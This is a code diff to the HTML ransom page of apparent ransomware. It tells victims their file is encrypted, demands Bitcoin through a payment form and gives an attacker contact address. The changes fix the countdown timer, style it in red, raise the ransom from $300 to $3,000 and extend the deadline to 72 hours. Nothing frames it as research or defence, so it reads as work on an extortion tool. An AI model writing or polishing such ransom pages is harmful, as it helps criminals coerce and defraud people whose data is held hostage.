@@ -15,7 +15,7 @@
                     const minutes = Math.floor((timeRemaining % 3600) / 60);
                     const seconds = timeRemaining % 60;
 
-                    timerElement.innerHTML = "Time Remaining: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}";
+                    timerElement.innerHTML = `Time Remaining: ${hours.toString().padStart(2, '0')}:${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
 
                     if (timeRemaining <= 0) {
                         clearInterval(interval);
@@ -27,6 +27,14 @@
 
             window.onload = updateTimer;
         </script>
+        <style>
+            #timer {
+                font-size: 24px;
+                color: red;
+                font-weight: bold;
+                margin: 20px 0;
+            }
+        </style>
     </head>
     <body>
         <header>
@@ -34,9 +42,10 @@
         </header>
         <main>
             <h2>File Access Denied</h2>
-            <p>Congratulations, your file has been encrypted. To regain access, you must pay a ransom of <strong>$300 worth of Bitcoin</strong>.</p>
+            <p>Congratulations, your file has been encrypted. To regain access, you must pay a ransom of <strong>$3,000 worth of Bitcoin</strong>.</p>
             <p>Contact us at: <strong>attacker@darkweb.com</strong></p>
-            <p>Time is of the essence! Failure to pay within 48 hours will result in permanent data loss.</p>
+            <p>Time is of the essence! Failure to pay within 72 hours will result in permanent data loss.</p>
+            <div id="timer"></div>
             <form action="process_payment.php" method="POST">
                 <label for="amount">Enter Amount in Bitcoin:</label>
                 <input type="text" id="amount" name="amount" required>
